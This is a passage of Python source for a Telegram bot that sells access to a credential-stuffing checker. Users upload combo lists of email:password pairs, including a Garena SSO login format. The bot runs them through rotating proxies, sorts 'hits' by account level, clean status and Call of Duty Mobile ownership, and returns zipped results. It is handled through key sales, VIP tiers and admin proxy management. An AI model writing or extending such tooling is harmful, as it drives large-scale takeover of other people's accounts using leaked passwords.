                u2=users_db2[uid2]; iv=u2.get("vip",False); ia=u2.get("activated",False)
                match=(mode=="all" and ia) or (mode=="vip" and ia and iv) or (mode=="nonvip" and ia and not iv)
                if match:
                    users_db2[uid2].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); cnt+=1
                    with sessions_lock:
                        if uid2 in active_sessions: active_sessions[uid2].get("stop_event",threading.Event()).set()
                    try: await context.bot.send_message(chat_id=int(uid2),text=" <b>Access Revoked</b>\n\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
                    except: pass
            save_users(users_db2)
            label={"all":"All","vip":"VIP","nonvip":"Non-VIP"}[mode]
            await query.answer(f" {cnt} keys removed")
            await _adm_edit(query,
                f" <b>Keys Removed ({label})</b>\n<code>{cnt}</code> user(s) revoked.",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_keys")]]))
            return

        # ── Users helper callbacks ────────────────────────────────────────
        if data in ("adm_ask_addvip","adm_ask_rmvip","adm_ask_ban","adm_ask_unban","adm_ask_broadcast"):
            hints2={"adm_ask_addvip":"/addvip <user_id>","adm_ask_rmvip":"/removevip <user_id>",
                    "adm_ask_ban":"/ban_user <user_id>","adm_ask_unban":"/unban_user <user_id>",
                    "adm_ask_broadcast":"/broadcast <message>"}
            await query.answer(hints2.get(data,""), show_alert=True)
            return

        # ── Proxy helper callbacks ────────────────────────────────────────
        if data=="adm_upload_proxy":
            uid_a=str(tg.id)
            with sessions_lock: active_sessions.setdefault(uid_a,{}); active_sessions[uid_a]["awaiting_proxy"]=True
            await _adm_edit(query," <b>Upload Proxy</b>\nSend your <code>.txt</code> proxy file now.",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_proxy")]]))
            return

        if data=="adm_paste_proxy":
            uid_a=str(tg.id)
            with sessions_lock: active_sessions.setdefault(uid_a,{}); active_sessions[uid_a]["awaiting_proxy_paste"]=True
            await _adm_edit(query,
                " <b>Paste Proxies</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                "Paste your proxy lines now (one per line).\n<code>host:port</code> or <code>host:port:user:pass</code>",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_proxy")]]))
            return

        if data=="adm_reload_proxy":
            try:
                geo_rotator.__init__()
                tot_p=geo_rotator.total if hasattr(geo_rotator, "total") else "?"
            except Exception as e: tot_p=f"err:{e}"
            await query.answer(f" Reloaded — {tot_p} proxies")
            pf_r=sorted(PROXY_DIR.glob("*.txt")); tp_r=0
            for p_r in pf_r:
                try:
                    with open(p_r,"r",encoding="utf-8",errors="ignore") as fh:
                        tp_r+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
                except: pass
            await _adm_edit(query,
                f" <b>Proxy</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"Files: <code>{len(pf_r)}</code>  ·  Proxies: <code>{tp_r:,}</code>\n Rotator reloaded!",
                _admin_proxy_kb())
            return

        if data=="adm_remove_proxy":
            pf_d=sorted(PROXY_DIR.glob("*.txt"))
            if not pf_d:
                await query.answer(" No proxy files.",show_alert=True); return
            btns_d=[[InlineKeyboardButton(f" {p.name}",callback_data=f"delproxy_{p.name}")] for p in pf_d]
            btns_d.append([InlineKeyboardButton(" Delete ALL",callback_data="delproxy_ALL")])
            btns_d.append([InlineKeyboardButton("« Back",callback_data="adm_proxy")])
            await _adm_edit(query," Tap file to delete:",InlineKeyboardMarkup(btns_d))
            return

        # ── Settings helper callbacks ─────────────────────────────────────
        if data=="adm_do_refresh":
            cfg_r=load_config()
            saved_mc=cfg_r.get("max_concurrent",5)
            if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
            try:
                geo_rotator.__init__()
            except: pass
            await query.answer(" Config reloaded!")
            await _adm_edit(query,
                f" <b>Settings</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Threads    : <code>{cfg_r.get('default_threads',5)}</code>\n"
                f" Concurrent : <code>{cfg_r.get('max_concurrent',5)}</code>\n"
                f" Limit      : <code>{cfg_r.get('global_limit') or 'Unlimited'}</code>\n"
                f" VIP Limit  : <code>{cfg_r.get('vip_limit') or 'Unlimited'}</code>\n"
                f" Config refreshed!",
                _admin_settings_kb(cfg_r))
            return

        if data in ("adm_ask_limit","adm_ask_viplimit","adm_ask_cooldown","adm_ask_threads","adm_ask_concurrent"):
            hints3={"adm_ask_limit":"/setlimit <n>  or  /setlimit off",
                    "adm_ask_viplimit":"/setlimitforvip <n>  or  /setlimitforvip off",
                    "adm_ask_cooldown":"/setcd <sessions> <minutes>  or  /setcd off",
                    "adm_ask_threads":"/setthreads <n>  (default threads per session)",
                    "adm_ask_concurrent":"/setconcurrent <n>  (1-50 simultaneous sessions)"}
            await query.answer(hints3.get(data,""), show_alert=True)
            return

        # ── Files helper callbacks ────────────────────────────────────────


        if data=="adm_ask_refreshcombo":
            count_c=0
            for uid_c in list(COMBO_DIR.iterdir()):
                if uid_c.is_dir():
                    for f_c in uid_c.glob("*.txt"):
                        try: f_c.unlink(); count_c+=1
                        except: pass
                    clear_persisted_session(uid_c.name)
                    with sessions_lock:
                        if uid_c.name in active_sessions and active_sessions[uid_c.name].get("status")!="checking":
                            del active_sessions[uid_c.name]
                    # Remove uid subfolder if now empty
                    try:
                        if uid_c.exists() and not any(uid_c.iterdir()): uid_c.rmdir()
                    except: pass
            await query.answer(f" Deleted {count_c} combo file(s)")
            await _adm_edit(query,f" <b>Combo Cleared</b>\nDeleted <code>{count_c}</code> file(s).",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_files")]]))
            return

        if data=="adm_ask_refreshresults":
            import shutil; dirs_r2=0
            for uid_r2 in RESULTS_DIR.iterdir():
                if uid_r2.is_dir():
                    try: shutil.rmtree(uid_r2); dirs_r2+=1
                    except: pass
            await query.answer(f" Cleared {dirs_r2} user(s)")
            await _adm_edit(query,f" <b>Results Cleared</b>\nDeleted results for <code>{dirs_r2}</code> user(s).",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_files")]]))
            return



        return

    # ── User deletes their own combo file ────────────────────────────────
    if data=="user_delete_file":
        with sessions_lock: s2=active_sessions.get(uid,{})
        if s2.get("status")=="checking":
            await query.answer(" Still checking! Use /stop first.",show_alert=True); return
        uc2=COMBO_DIR/uid
        existing2=list(uc2.glob("*.txt")) if uc2.exists() else []
        cur_file2=s2.get("file","")
        deleted2=[]
        for f in existing2:
            try: f.unlink(); deleted2.append(f.name)
            except: pass
        if cur_file2:
            try:
                fp2=Path(cur_file2)
                if fp2.exists(): fp2.unlink()
                if fp2.name not in deleted2: deleted2.append(fp2.name)
            except: pass
        # Remove combo/{uid}/ folder if now empty
        if uc2.exists():
            try:
                if not any(uc2.iterdir()): uc2.rmdir()
            except: pass
        clear_persisted_session(uid)
        with sessions_lock:
            if uid in active_sessions: del active_sessions[uid]
        names2=", ".join(f"<code>{n}</code>" for n in deleted2) if deleted2 else "your file"
        await query.edit_message_text(
            f" <b>File Deleted!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Deleted: {names2}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"You can now upload a new file via /start.",
            parse_mode=ParseMode.HTML)
        return

    # ── Resume after restart ─────────────────────────────────────────────
    if data.startswith("resume_check_"):
        target_uid = data[len("resume_check_"):]
        # Only the owner of that session can resume it
        if uid != target_uid:
            await query.answer(" Not your session.",show_alert=True); return
        with sessions_lock: s2=active_sessions.get(uid)
        if not s2 or not s2.get("file"):
            await query.answer(" Session expired. Use /start.",show_alert=True); return
        if not Path(s2["file"]).exists():
            await query.answer(" File missing. Upload again via /start.",show_alert=True)
            clear_persisted_session(uid)
            with sessions_lock: active_sessions.pop(uid,None)
            return
        if s2.get("status")=="checking":
            await query.answer(" Already checking!",show_alert=True); return
        # Patch stop_event in case it was set during crash
        with sessions_lock:
            active_sessions[uid]["stop_event"]=threading.Event()
            active_sessions[uid]["status"]="file_received"
        await query.edit_message_text(
            f" <b>Session Restored!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" File: <code>{Path(s2['file']).name}</code>\n"
            f" Configure or start below:",
            reply_markup=kb_settings(uid), parse_mode=ParseMode.HTML)
        return

    if data.startswith("cancel_resume_"):
        target_uid = data[len("cancel_resume_"):]
        if uid != target_uid:
            await query.answer(" Not your session.",show_alert=True); return
        with sessions_lock: s2=active_sessions.get(uid,{})
        fpath=s2.get("file")
        if fpath: del_combo(fpath)
        clear_persisted_session(uid)
        with sessions_lock: active_sessions.pop(uid,None)
        await query.edit_message_text(
            " <b>Session cancelled.</b>\nYour file has been deleted.\nUse /start to begin a new session.",
            parse_mode=ParseMode.HTML)
        return

    # proxy delete buttons
    if data.startswith("delproxy_") or data=="delproxy_ALL":
        if not is_admin(tg.id,cfg): await query.answer(" Admin only.",show_alert=True); return
        if data=="delproxy_ALL":
            cnt=0
            for pf in list(PROXY_DIR.glob("*.txt")):
                try: pf.unlink(); cnt+=1
                except: pass
            await query.edit_message_text(f" <b>Deleted all {cnt} proxy file(s).</b>\n Proxy folder is now empty.",parse_mode=ParseMode.HTML)
            return
        fname=data[len("delproxy_"):]; fpath=PROXY_DIR/fname
        if not fpath.exists(): await query.answer(" File not found.",show_alert=True); return
        try:
            fpath.unlink()
            rem=sorted(PROXY_DIR.glob("*.txt"))
            if not rem:
                await query.edit_message_text(" <b>Deleted!</b>\n No more proxy files.",parse_mode=ParseMode.HTML); return
            lines=[" <b>Proxy Files</b> — tap to delete:\n━━━━━━━━━━━━━━━━━━━━"]
            btns=[]
            for pf in rem:
                try:
                    with open(pf,"r",encoding="utf-8",errors="ignore") as rf:
                        cnt=sum(1 for ln in rf if ln.strip() and not ln.strip().startswith("#"))
                    sz=pf.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
                    lines.append(f" <code>{pf.name}</code>  ({cnt:,} proxies · {ss})")
                except: lines.append(f" <code>{pf.name}</code>   unreadable")
                btns.append([InlineKeyboardButton(f" Delete  {pf.name}",callback_data=f"delproxy_{pf.name}")])
            btns.append([InlineKeyboardButton(" Delete ALL proxy files",callback_data="delproxy_ALL")])
            lines.append(f"━━━━━━━━━━━━━━━━━━━━\nTotal: <code>{len(rem)}</code> file(s)")
            await query.edit_message_text("\n".join(lines),reply_markup=InlineKeyboardMarkup(btns),parse_mode=ParseMode.HTML)
        except Exception as e: await query.answer(f" {e}",show_alert=True)
        return

    # all others need gate
    allowed,ud,users=await gate_cb(query,context)
    if not allowed: return

    if data=="start_check":
        with sessions_lock: ex=active_sessions.get(uid)
        if ex and ex.get("status")=="checking":
            await query.edit_message_text(" Already have an active session!\nUse /stop first.",parse_mode=ParseMode.HTML); return
        with sessions_lock:
            active_sessions[uid]={"status":"waiting_file","file":None,"stop_event":threading.Event(),
                                   "lvl_key":"lvl_all","cf_key":"cf_both","chat_id":query.message.chat_id}
        m=await query.edit_message_text(
            " <b>Send Your Combo File</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            " Send a <code>.txt</code> file. Supported formats:\n"
            "<code>email:password</code>\n"
            "<code>user:pass</code>\n"
            "<code>https://sso.garena.com/ui/register:user:pass</code>\n"
            "━━━━━━━━━━━━━━━━━━━━\n Waiting for your file…",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(" I haven't sent it yet",callback_data="remind_file")]]),
            parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)

    elif data=="remind_file":
        with sessions_lock: s=active_sessions.get(uid)
        if not s or not s.get("file"): await query.answer(" You haven't sent any files yet! Please send your files first.",show_alert=True)
        else: await query.answer(" File already received!",show_alert=True)

    elif data=="open_level_menu":
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
        await query.edit_message_text(" <b>Choose Level Threshold</b>\n\nHits at or above this level sent live:",reply_markup=kb_level(),parse_mode=ParseMode.HTML)

    elif data=="open_filter_menu":
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
        await query.edit_message_text(" <b>Choose Hit Filter</b>\n\nWhich accounts sent to you?",reply_markup=kb_filter(),parse_mode=ParseMode.HTML)

    elif data.startswith("set_lvl_"):
        k=data[8:]
        if k not in LEVEL_OPTIONS: await query.answer("Invalid.",show_alert=True); return
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
            active_sessions[uid]["lvl_key"]=k
            s2=active_sessions[uid]
        # Update persisted session so restart recovers the new setting
        ps2=load_persisted_sessions()
        if uid in ps2: ps2[uid]["lvl_key"]=k; persist_session(uid,ps2[uid])
        await query.edit_message_text(f" Level: <b>{LEVEL_OPTIONS[k]['label']}</b>\n\nConfigure or start:",reply_markup=kb_settings(uid),parse_mode=ParseMode.HTML)

    elif data.startswith("set_cf_"):
        k=data[7:]
        if k not in CLEAN_OPTIONS: await query.answer("Invalid.",show_alert=True); return
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
            active_sessions[uid]["cf_key"]=k
        # Update persisted session so restart recovers the new setting
        ps2=load_persisted_sessions()
        if uid in ps2: ps2[uid]["cf_key"]=k; persist_session(uid,ps2[uid])
        await query.edit_message_text(f" Filter: <b>{CLEAN_OPTIONS[k]['label']}</b>\n\nConfigure or start:",reply_markup=kb_settings(uid),parse_mode=ParseMode.HTML)

    elif data=="back_to_settings":
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
            s=active_sessions[uid]
        fn=Path(s["file"]).name if s.get("file") else "N/A"
        await query.edit_message_text(f" <b>Settings</b>\n File: <code>{fn}</code>\nConfigure below:",reply_markup=kb_settings(uid),parse_mode=ParseMode.HTML)

    elif data=="do_start_check":
        with sessions_lock: s=active_sessions.get(uid)
        if not s: await query.answer("Session expired.",show_alert=True); return
        if not s.get("file"): await query.answer(" No file received yet! Send your .txt file first.",show_alert=True); return
        if s.get("status")=="checking": await query.answer(" Already checking! Use /stop first.",show_alert=True); return

        cfg2=load_config()
        on_cd,ml=check_cooldown(uid,cfg2)
        if on_cd and not is_admin(tg.id,cfg2):
            h,m_=int(ml//60),int(ml%60)
            ts_="{}h {}m".format(h,m_) if h else "{}m".format(m_)
            await query.answer(f" Cooldown! Wait {ts_}.",show_alert=True); return

        combo=Path(s["file"]); stop_ev=s["stop_event"]
        lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
        thr=LEVEL_OPTIONS[lk]["threshold"]; clf=CLEAN_OPTIONS[ck]["filter"]
        cid=s.get("chat_id",query.message.chat_id); ll=LEVEL_OPTIONS[lk]["label"]; cl=CLEAN_OPTIONS[ck]["label"]
        ts=datetime.now().strftime("%Y%m%d_%H%M%S"); rf=RESULTS_DIR/uid/ts; rf.mkdir(parents=True,exist_ok=True)
        udb=load_users(); isv=udb.get(uid,{}).get("vip",False) or is_admin(tg.id,cfg2)
        # Per-user custom_limit overrides global limit
        custom_lim=udb.get(uid,{}).get("custom_limit")
        lim=custom_lim or (cfg2.get("vip_limit") if isv else cfg2.get("global_limit"))
        threads=cfg2.get("default_threads",5)
        _hits_on = udb.get(uid,{}).get("hits_notif", False)
        btok=cfg2["bot_token"] if _hits_on else None
        try:
            with open(combo,"r",encoding="utf-8",errors="ignore") as f: total_lines=sum(1 for ln in f if ln.strip() and ":" in ln)
        except: total_lines=0
        disp=min(lim,total_lines) if lim else total_lines
        # Apply global max_lines_per_check cap (hard ceiling per session)
        ml_cap=cfg2.get("max_lines_per_check")
        if ml_cap: disp=min(disp,ml_cap)

        with sessions_lock:
            active_sessions[uid]["status"]="checking"
            active_sessions[uid]["result_folder"]=str(rf)
            active_sessions[uid]["orig_total"]=disp

        _hits_label = f"{pe(3)} 🔔 Live Hits: ON" if _hits_on else f"{pe(1)} 🔕 Live Hits: OFF — /hitson para i-enable"
        smsg=await query.edit_message_text(
            f"{pe(5)} <b>CHECKER LAUNCHED!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} <b>SESSION INFO</b> {pe(2)}\n"
            f"{pe_thin()}\n"
            f"{pe(2)} Lines   : <b><code>{disp:,}</code></b>\n"
            f"{pe(1)} Threads : <code>{threads}</code>\n"
            f"{pe(2)} Level   : <b>{ll}</b>\n"
            f"{pe(2)} Filter  : <b>{cl}</b>\n"
            f"{pe_sep()}\n"
            f"{_hits_label}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} /check — live stats\n"
            f"{pe(1)} /stop  — stop & get results",
            parse_mode=ParseMode.HTML)
        if smsg: track(uid,smsg.message_id)
        loop=asyncio.get_event_loop()

        # ── Persist session for crash-resume ──────────────────────
        persist_session(uid, {
            "file": str(combo), "chat_id": cid,
            "lvl_key": lk, "cf_key": ck,
            "status_msg_id": smsg.message_id if smsg else None,
            "username": tg.username or "",
            "first_name": tg.first_name or "",
            "status": "checking",
            "result_folder": str(rf),   # ← save so resume reuses same folder
            "orig_total": disp,         # ← save so progress % is correct after restart
        })

        # ── 3-minute live status updater + auto zip sender ──────
        _status_stop = threading.Event()
        _auto_part   = [1]   # part counter for auto-sends

        def _status_loop():
            while not _status_stop.wait(180):
                with sessions_lock: s2 = active_sessions.get(uid, {})
                if s2.get("status") != "checking": break

                # ── Update stats card ─────────────────────────────────
                ls2 = s2.get("live_stats")
                if ls2 is not None:
                    cur_stats = ls2.get_stats()
                    # ── Persist stats snapshot for crash recovery ─────
                    update_persisted_stats(uid, cur_stats)
                    # Use LiveStats.total as accurate processed counter
                    done_count = cur_stats.get("total", 0)
                    if disp and done_count > disp: done_count = disp
                    card = stats_card(done_count, disp, cur_stats, ll, cl,
                                       result_folder=str(rf))
                    try:
                        asyncio.run_coroutine_threadsafe(
                            context.bot.edit_message_text(
                                chat_id=cid, message_id=smsg.message_id,
                                text=card, parse_mode=ParseMode.HTML), loop)
                    except: pass

                # ── Auto-send partial zip when results near 49 MB ─────
                try:
                    cur_rf = Path(s2.get("result_folder", str(rf)))
                    result_files = [f for f in cur_rf.rglob("*")
                                    if f.is_file() and not f.name.endswith(".zip")]
                    folder_size  = sum(f.stat().st_size for f in result_files)
                    if folder_size >= int(TG_MAX_BYTES * 0.85):
                        pzip = cur_rf / f"results_{uid}_{ts}_auto{_auto_part[0]}.zip"
                        with zipfile.ZipFile(pzip, "w", zipfile.ZIP_DEFLATED) as zf:
                            for f in result_files: zf.write(f, f.relative_to(cur_rf))
                        ls3  = s2.get("live_stats")
                        snap = ls3.get_stats() if ls3 else {}
                        asyncio.run_coroutine_threadsafe(
                            deliver_results(context.bot, cid, uid, [pzip], snap,
                                            combo_file=None, partial=True), loop)
                        # Delete sent source files so new hits go to a fresh batch
                        for f in result_files:
                            try: f.unlink()
                            except: pass
                        _auto_part[0] += 1
                except: pass

        threading.Thread(target=_status_loop, daemon=True, name=f"status-{uid}").start()

        def bg():
            _enqueue(uid)
            pos=_queue_pos(uid)
            if pos>1:
                asyncio.run_coroutine_threadsafe(context.bot.send_message(chat_id=cid,
                    text=f" <b>Queue Position: #{pos}</b>\nWaiting for a free slot…\nUse /stop to cancel.",
                    parse_mode=ParseMode.HTML),loop)
            _checker_semaphore.acquire(); _dequeue(uid)
            with sessions_lock:
                if active_sessions.get(uid,{}).get("status")!="checking" or stop_ev.is_set():
                    _checker_semaphore.release(); _status_stop.set(); return
            try:
                asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(
                    chat_id=cid,message_id=smsg.message_id,
                    text=(f" <b>Checker Running!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                          f" Lines   : <code>{disp:,}</code>\n Threads : <code>{threads}</code>\n"
                          f" Level   : <b>{ll}</b>\n Filter  : <b>{cl}</b>\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n Hits sent here live!\n /check   /stop"),
                    parse_mode=ParseMode.HTML),loop)
            except: pass
            try:
                # ── Guard: checker module must be available ───────────────
                if not CHECKER_OK:
                    asyncio.run_coroutine_threadsafe(
                        context.bot.send_message(
                            chat_id=cid,
                            text=(f" <b>Checker Unavailable</b>\n"
                                  f"━━━━━━━━━━━━━━━━━━━━\n"
                                  f"The checker module failed to load.\n"
                                  f"<code>{CHECKER_ERR[:300]}</code>\n\n"
                                  f"Contact admin to fix the deployment."),
                            parse_mode=ParseMode.HTML), loop)
                    return
                st=run_checker(uid,combo,rf,lim,threads,stop_ev,btok,cid,thr,clf)
                # ── If checker returned an error, show it and stop ────────
                if st.get("error"):
                    asyncio.run_coroutine_threadsafe(
                        context.bot.send_message(
                            chat_id=cid,
                            text=(f" <b>Checker Error</b>\n"
                                  f"━━━━━━━━━━━━━━━━━━━━\n"
                                  f"<code>{st['error'][:400]}</code>"),
                            parse_mode=ParseMode.HTML), loop)
                    return
                u2=load_users()
                if uid in u2:
                    u2[uid]["total_checked"]+=st.get("total",0)
                    u2[uid]["sessions_count"]+=1; save_users(u2)
                zo=rf/f"results_{uid}_{ts}.zip"; zp=zip_results(rf,zo)
                # Check if stopped mid-way AND user chose "continue" (stop_continue flag)
                with sessions_lock: s2=active_sessions.get(uid,{})
                is_continuing=s2.get("stop_continue",False)
                if is_continuing:
                    # Send partial results but keep combo file alive
                    asyncio.run_coroutine_threadsafe(
                        deliver_results(context.bot,cid,uid,zp,st,combo_file=None,partial=True),loop)
                    # Reset stop event and re-launch checker for remaining lines
                    new_stop=threading.Event()
                    with sessions_lock:
                        if uid in active_sessions:
                            active_sessions[uid]["stop_event"]=new_stop
                            active_sessions[uid]["stop_continue"]=False
                            active_sessions[uid]["status"]="checking"
                    _checker_semaphore.release()
                    _status_stop.set()
                    # Launch new bg thread for remaining lines
                    new_ts=datetime.now().strftime("%Y%m%d_%H%M%S")
                    new_rf=RESULTS_DIR/uid/new_ts; new_rf.mkdir(parents=True,exist_ok=True)
                    with sessions_lock:
                        if uid in active_sessions:
                            active_sessions[uid]["result_folder"]=str(new_rf)
                    def _continue_bg():
                        _enqueue(uid)
                        _checker_semaphore.acquire(); _dequeue(uid)
                        try:
                            st2=run_checker(uid,combo,new_rf,lim,threads,new_stop,btok,cid,thr,clf,is_resume=True)
                            u3=load_users()
                            if uid in u3:
                                u3[uid]["total_checked"]+=st2.get("total",0)
                                save_users(u3)
                            zo2=new_rf/f"results_{uid}_{new_ts}.zip"; zp2=zip_results(new_rf,zo2)
                            note2=" (Stopped)" if new_stop.is_set() else ""
                            asyncio.run_coroutine_threadsafe(
                                deliver_results(context.bot,cid,uid,zp2,st2,combo_file=combo,note=note2),loop)
                        except Exception as ex2:
                            asyncio.run_coroutine_threadsafe(context.bot.send_message(
                                chat_id=cid,text=f" <b>Error:</b> <code>{str(ex2)[:300]}</code>",
                                parse_mode=ParseMode.HTML),loop)
                        finally:
                            _checker_semaphore.release(); inc_session(uid); del_combo(combo)
                            clear_persisted_session(uid)
                            with sessions_lock:
                                if uid in active_sessions:
                                    active_sessions[uid]["status"]="done"
                                    try:
                                        _ls=active_sessions[uid].get("live_stats")
                                        _ps=active_sessions[uid].get("prev_stats",{})
                                        _pp=active_sessions[uid].get("prev_processed",0)
                                        _cs=_ls.get_stats() if _ls else {}
                                        _fs=dict(_cs)
                                        if _ps:
                                            for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                                _fs[_k]=_cs.get(_k,0)+_ps.get(_k,0)
                                        _fs["total"]=_pp+_cs.get("total",0)
                                        active_sessions[uid]["final_stats"]=_fs
                                    except: pass
                    threading.Thread(target=_continue_bg,daemon=True,name=f"checker-cont-{uid}").start()
                    return  # exit current bg, _continue_bg takes over
                else:
                    note=" (Stopped)" if stop_ev.is_set() else ""
                    asyncio.run_coroutine_threadsafe(
                        deliver_results(context.bot,cid,uid,zp,st,combo_file=combo,note=note),loop)
            except Exception as ex:
                asyncio.run_coroutine_threadsafe(context.bot.send_message(chat_id=cid,
                    text=f" <b>Error:</b> <code>{str(ex)[:300]}</code>",parse_mode=ParseMode.HTML),loop)
            finally:
                _status_stop.set()
                _checker_semaphore.release(); inc_session(uid); del_combo(combo)
                clear_persisted_session(uid)
                with sessions_lock:
                    if uid in active_sessions:
                        active_sessions[uid]["status"]="done"
                        try:
                            _ls=active_sessions[uid].get("live_stats")
                            _ps=active_sessions[uid].get("prev_stats",{})
                            _pp=active_sessions[uid].get("prev_processed",0)
                            _cs=_ls.get_stats() if _ls else {}
                            _fs=dict(_cs)
                            if _ps:
                                for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                    _fs[_k]=_cs.get(_k,0)+_ps.get(_k,0)
                            _fs["total"]=_pp+_cs.get("total",0)
                            active_sessions[uid]["final_stats"]=_fs
                        except: pass

        t=threading.Thread(target=bg,daemon=True,name=f"checker-{uid}"); t.start()
        with sessions_lock: active_sessions[uid]["thread"]=t

# ════════════════════════════════════════════
#  DOCUMENT HANDLER
# ════════════════════════════════════════════
async def on_text(update,context):
    """Route ReplyKeyboard button presses and handle proxy paste / awaited inputs."""
    tg=update.effective_user; uid=str(tg.id); cfg=load_config()
    text=(update.message.text or "").strip()
    if not text: return

    # ── Admin proxy-line number input ────────────────────────────────────
    with sessions_lock:
        pf_await=active_sessions.get(uid,{}).get("awaiting_proxy_line",None)
        pp_await=active_sessions.get(uid,{}).get("awaiting_proxy_paste",False)
        adm_await=active_sessions.get(uid,{}).get("awaiting_admin_input",None)

    # ── Admin awaited inputs (text prompts for settings) ─────────────────
    if adm_await:
        await _handle_admin_text_input(update, context, uid, tg, cfg, adm_await, text)
        return

    # ── Proxy line number awaited ─────────────────────────────────────────
    if pf_await and text.isdigit():
        await _handle_proxy_line_check(update, context, uid, pf_await, int(text))
        return

    # ── Proxy paste awaited ───────────────────────────────────────────────
    if pp_await and is_admin(tg.id,cfg):
        valid=[]; invalid=0
        for ln in text.splitlines():
            ln=ln.strip()
            if not ln or ln.startswith("#"): continue
            if ":" in ln or "://" in ln: valid.append(ln)
            else: invalid+=1
        if not valid:
            await update.message.reply_text(
                f"{pe(2)} <b>No Valid Proxies Found</b>\n"
                f"{pe_sep()}\n"
                f"Each line must be <code>host:port</code> or <code>scheme://host:port</code>.",
                parse_mode=ParseMode.HTML); return
        fname=f"pasted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        dest=PROXY_DIR/fname
        with open(dest,"w",encoding="utf-8") as f:
            for ln in valid: f.write(ln+"\n")
        with sessions_lock:
            if uid in active_sessions: active_sessions[uid]["awaiting_proxy_paste"]=False
        try:
            geo_rotator.__init__()
            reload_str=f"Proxy rotator reloaded"
        except Exception as e: reload_str=f"Reload failed: {e}"
        all_pf=sorted(PROXY_DIR.glob("*.txt"))
        fl="\n".join(f"   <code>{p.name}</code>" for p in all_pf) or "  (none)"
        await update.message.reply_text(
            f"{pe(3)} <b>Proxies Saved!</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} File    : <code>{fname}</code>\n"
            f"{pe(1)} Saved   : <code>{len(valid):,}</code> proxies\n"
            f"{pe(1)} Skipped : <code>{invalid}</code> invalid\n"
            f"{pe_sep()}\n{reload_str}\n{pe_sep()}\n"
            f"<b>All proxy files:</b>\n{fl}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_admin_main(cfg))
        return

    # ── ReplyKeyboard button routing ─────────────────────────────────────
    ud,_ = get_or_create_user(uid, tg.username or "", tg.first_name or "")

    # ── USER buttons ──────────────────────────────────────────────────────
    if text == BTN_CHECK:
        # Simulate /start → start_check flow
        await _handle_start_check(update, context, uid, tg, cfg, ud)
        return

    if text == BTN_ADMIN:
        if not is_admin(tg.id,cfg):
            await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
        await _show_admin_panel(update.message, cfg)
        return

    if text == BTN_STATUS:
        await cmd_status(update, context); return

    if text == BTN_STOP:
        await _do_stop(update, context); return

    if text == BTN_RESULTS:
        await cmd_myresultsfile(update, context); return

    if text == BTN_DELETE:
        await cmd_delete_file(update, context); return

    if text == BTN_HITS_ON:
        await cmd_hits_on(update, context); return

    if text == BTN_HITS_OFF:
        await cmd_hits_off(update, context); return

    if text == BTN_BUY:
        await cmd_buy(update, context); return

    if text == BTN_DEMO:
        await cmd_demo(update, context); return

    # ── SETTINGS buttons (while in setup state) ───────────────────────────
    if text == BTN_START_NOW:
        # Delegate to callback handler logic
        class _FakeQuery:
            data = "do_start_check"
            from_user = tg
            message = update.message
            async def answer(self, *a, **kw): pass
            async def edit_message_text(self, *a, **kw):
                await update.message.reply_text(*a, **kw)
        await _do_start_check_logic(update, context, uid, cfg, ud)
        return

    if text == BTN_LVL_MENU:
        with sessions_lock: s=active_sessions.get(uid,{})
        lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
        await update.message.reply_text(
            f"{pe(2)} <b>Choose Level Filter</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Current : {LEVEL_OPTIONS[lk]['label']}\n"
            f"{pe_sep()}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_level()); return

    if text == BTN_CF_MENU:
        with sessions_lock: s=active_sessions.get(uid,{})
        lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
        await update.message.reply_text(
            f"{pe(2)} <b>Choose Clean Filter</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Current : {CLEAN_OPTIONS[ck]['label']}\n"
            f"{pe_sep()}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_filter()); return

    if text in LEVEL_BTN_MAP:
        key = LEVEL_BTN_MAP[text]
        with sessions_lock:
            active_sessions.setdefault(uid,{})["lvl_key"] = key
        lk=key; ck=active_sessions.get(uid,{}).get("cf_key","cf_both")
        await update.message.reply_text(
            f"{pe(2)} <b>Level Filter Set</b>\n"
            f"{pe_sep()}\n"
